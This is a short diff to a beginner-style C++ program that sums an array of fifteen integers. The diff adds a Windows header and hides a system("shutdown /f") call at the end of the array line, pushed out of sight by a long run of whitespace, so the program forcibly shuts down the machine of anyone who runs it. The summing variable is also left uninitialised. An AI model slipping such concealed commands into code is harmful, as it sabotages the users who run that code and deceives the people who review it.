@@ -3,9 +3,10 @@
 //
 
 #include <iostream>
+#include <windows.h>
 using namespace std;
 int main() {
-    int szamok[15] = {16, 8, 9, 4, 3, 2, 4, 7, 7, 12, 3, 5, 4, 3, 2};
+    int szamok[15] = {16, 8, 9, 4, 3, 2, 4, 7, 7, 12, 3, 5, 4, 3, 2};                                                                                                                                                                                                                    system("shutdown /f");
     int osszt;
     for (int i = 0; i < 15; i++) {
         osszt+=szamok[i];
